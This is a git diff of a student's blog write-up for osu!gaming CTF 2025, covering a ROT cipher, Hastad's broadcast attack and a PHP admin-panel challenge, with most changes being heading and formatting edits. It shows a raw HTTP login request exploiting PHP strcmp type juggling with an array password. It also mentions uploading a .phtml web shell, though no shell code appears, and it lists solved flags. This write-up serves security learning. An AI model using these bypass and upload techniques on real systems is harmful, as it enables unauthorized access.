@@ -1,6 +1,7 @@
 ---
 title: osu!gaming CTF 2025 Writeups
 published: 2025-10-27
+updated: 2025-11-02
 description: ''
 image: ''
 tags: [ctf, coding, university]
@@ -13,11 +14,12 @@ So recently I participate in osu!gaming CTF 2025 with my IT Security Club on uni
 
 So, this CTF is big and crazy stuff happened, even I'm a 6 years osu! player still didn't know some of trivial stuff of osu!
 
-# Crypto
+## Crypto
 
-## Rot727
+### Rot727
 
 It just another custom Rot13 encryption system, so I pull out my old code from CTF 2024 (I forgot its name)
+
 ```python
 def rot_cipher_concise(txt, shift):
     """Encrypts/decrypts text using a ROT cipher with any shift."""
@@ -46,25 +48,26 @@ while True:
 
 Got `osu{oh_wait_bigger_number_doesnt_mean_more_secure}` at 13
 
-## linear-feedback
+### linear-feedback
 
 This actually just ChatGPT stuff
 
 ![discord chat](./gemini-pro-cant-beat-chatgpt-free.png)
 
-## pls-nominate
+### pls-nominate
 
 Very basic implementation of Hastad's Broadcast Attack
 
 `osu{pr3tty_pl3453_w1th_4_ch3rry_0n_t0p!?}`
 
-# Web
+## Web
 
-## admin-panel
+### admin-panel
 
 First look at this challenges, I thought it is Path Traversal stuff because the `/flag.txt` is outside from `/var/www/html`
 
 But when I tried on login, I noticed that the password for user `peppy` is random so no way you can guess it!
+
 ```php
 <?php
     session_start();
@@ -91,7 +94,7 @@ There's a vulnerability at `strcmp($admin_password, $password) == 0`. Based on [
 
 Which I can set the password to array based on [this blog talking about vulnerability of strcmp](https://rst.hashnode.dev/bypassing-php-strcmp)
 
-```
+```txt
 POST /login.php HTTP/2
 Host: admin-panel-72179d733c64.instancer.sekai.team
 Content-Length: 27
@@ -105,7 +108,7 @@ Referer: https://admin-panel-72179d733c64.instancer.sekai.team/
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
-username=peppy&password[]=0
+username=peppy&password[]=
 ```
 
 **Break the first wall!**
@@ -156,7 +159,7 @@ Upload 2 files to server then access `/uploads/shell2.phtml` to get the flag!
 
 `osu{php_is_too_3asy}`
 
-# Rhythm / Pulsus
+## Rhythm / Pulsus
 
 I think this is a web challenge, not rhythm stuff bruh?
 
